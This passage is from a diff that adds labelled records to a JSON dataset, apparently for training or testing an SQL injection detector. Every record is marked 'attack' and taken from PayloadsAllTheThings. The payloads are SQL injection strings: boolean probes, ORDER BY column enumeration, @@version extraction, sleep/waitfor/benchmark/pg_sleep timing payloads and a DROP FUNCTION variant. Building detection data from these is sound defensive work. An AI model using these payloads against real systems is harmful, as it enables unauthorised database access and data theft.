+    "text": "OR x=x--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR x=y--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR 3409=3409 AND ('pytW' LIKE 'pytW",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "OR 3409=3409 AND ('pytW' LIKE 'pytY",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "HAVING 1=1",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "HAVING 1=0",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "HAVING 1=1#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "HAVING 1=0#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "HAVING 1=1--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "HAVING 1=0--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 1=1",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 1=0",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 1=1--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 1=0--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 1=1#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 1=0#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 1=1 AND '%'='",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 1=0 AND '%'='",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 1083=1083 AND (1427=1427",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 7506=9091 AND (5913=5913",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 1083=1083 AND ('1427=1427",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 7506=9091 AND ('5913=5913",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 7300=7300 AND 'pKlZ'='pKlZ",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 7300=7300 AND 'pKlZ'='pKlY",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 7300=7300 AND ('pKlZ'='pKlZ",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AND 7300=7300 AND ('pKlZ'='pKlY",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AS INJECTX WHERE 1=1 AND 1=1",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AS INJECTX WHERE 1=1 AND 1=0",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AS INJECTX WHERE 1=1 AND 1=1#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AS INJECTX WHERE 1=1 AND 1=0#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AS INJECTX WHERE 1=1 AND 1=1--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "AS INJECTX WHERE 1=1 AND 1=0--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "WHERE 1=1 AND 1=1",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "WHERE 1=1 AND 1=0",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "WHERE 1=1 AND 1=1#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "WHERE 1=1 AND 1=0#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "WHERE 1=1 AND 1=1--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "WHERE 1=1 AND 1=0--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 2--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 3--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 4--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 5--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 6--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 7--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 8--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 9--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 10--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 11--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 12--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 13--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 14--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 15--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 16--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 17--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 18--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 19--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 20--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 21--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 22--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 23--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 24--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 25--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 26--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 27--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 28--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 29--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 30--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 31337--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 2#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 3#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 4#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 5#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 6#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 7#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 8#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 9#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 10#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 11#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 12#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 13#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 14#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 15#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 16#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 17#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 18#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 19#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 20#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 21#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 22#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 23#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 24#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 25#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 26#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 27#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 28#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 29#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 30#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 31337#",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 2",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 3",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 4",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 5",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 6",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 7",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 8",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 9",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 10",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 11",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 12",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 13",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 14",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 15",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 16",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 17",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 18",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 19",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 20",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 21",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 22",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 23",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 24",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 25",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 26",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 27",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 28",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 29",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 30",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 31337",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "%' AND 8310=8310 AND '%'='",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "%' AND 8310=8311 AND '%'='",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "and (select substring(@@version,1,1))='X'",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "and (select substring(@@version,1,1))='M'",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "and (select substring(@@version,2,1))='i'",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "and (select substring(@@version,2,1))='y'",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "and (select substring(@@version,3,1))='c'",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "and (select substring(@@version,3,1))='S'",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "and (select substring(@@version,3,1))='X'",
+    "label": "attack",
+    "category": "pat-Generic_ErrorBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "sleep(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1 or sleep(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or sleep(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or sleep(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or sleep(5)=\"",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or sleep(5)='",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1) or sleep(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or sleep(5)=\"",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or sleep(5)='",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1)) or sleep(5)#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\")) or sleep(5)=\"",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "')) or sleep(5)='",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": ";waitfor delay '0:0:5'--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": ");waitfor delay '0:0:5'--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "';waitfor delay '0:0:5'--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\";waitfor delay '0:0:5'--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "');waitfor delay '0:0:5'--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\");waitfor delay '0:0:5'--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "));waitfor delay '0:0:5'--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'));waitfor delay '0:0:5'--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"));waitfor delay '0:0:5'--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "benchmark(10000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1 or benchmark(10000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or benchmark(10000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or benchmark(10000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1) or benchmark(10000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or benchmark(10000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or benchmark(10000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1)) or benchmark(10000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\")) or benchmark(10000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "')) or benchmark(10000000,MD5(1))#",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1 or pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" or pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "' or pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1) or pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\") or pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "') or pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1)) or pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\")) or pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "')) or pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "||pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1||pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"||pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "'||pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "1)||pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\")||pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "')||pg_sleep(5)--",
+    "label": "attack",
+    "category": "pat-Generic_TimeBased",
